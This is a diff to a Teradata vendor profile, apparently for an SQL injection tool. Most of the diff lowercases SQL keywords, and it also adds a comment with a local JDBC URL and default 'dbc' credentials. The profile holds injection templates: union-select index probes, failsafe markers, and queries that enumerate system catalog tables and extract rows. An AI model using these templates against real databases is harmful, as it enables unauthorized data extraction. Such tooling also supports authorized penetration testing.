@@ -1,4 +1,6 @@
 vendor: Teradata
+# jdbc:teradata://127.0.0.1
+# dbc dbc
 
 resource:
  info: |
@@ -19,7 +21,7 @@ resource:
    FROM (
        select
            DatabaseName,
-           ROW_NUMBER() over (ORDER BY DatabaseName) AS rnum
+           row_number() over (order by DatabaseName) AS rnum
        from DBC.DBASE
    ) x
    where 1 = 1
@@ -33,7 +35,7 @@ resource:
    FROM (
        select
            TVMName,
-           ROW_NUMBER() over (ORDER BY TVMName) AS rnum
+           row_number() over (order by TVMName) AS rnum
        from DBC.TVM t
        inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
        where DatabaseName = '${database}'
@@ -49,7 +51,7 @@ resource:
    FROM (
        select
            FieldName,
-           ROW_NUMBER() over (ORDER BY FieldName) AS rnum
+           row_number() over (order by FieldName) AS rnum
        from (
            select distinct FieldName
            from DBC.TVFIELDS c
@@ -64,14 +66,14 @@ resource:
 
   row:
    query: |
-    SELECT
+    select
         '${enclose_value_sql}'
         || r
         || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
     from (
         select
             ${fields} r,
-            ROW_NUMBER() over (ORDER BY 1) AS rnum
+            row_number() over (order by 1) AS rnum
         from ${database}.${table}
     )x
     where 1 = 1
@@ -88,14 +90,14 @@ strategy:
         * If reach end of string (${lead}i) then NULLIF nullifies the result
         */
        '${lead}'
-       || NULLIF(
+       || nullif(
            substr(
                (${injection}),
                ${window.char}
            ),
            '${trail_sql}'
         )
-  limit: and rnum BETWEEN ${limit.value} AND ${limit.value}
+  limit: and rnum between ${limit.value} and ${limit.value}
   failsafe: trim('' || (1337${indice}7330%2b1))
   calibrator: |
    cast(
@@ -113,6 +115,6 @@ strategy:
     - Teradata database
 
  normal:
-  indices: union select ${indices} FROM (SELECT 1 AS x)x
+  indices: union select ${indices} from (select 1 as x)x
   capacity: (select '${lead}${indice}' || ${calibrator})
   orderBy: order by 1337
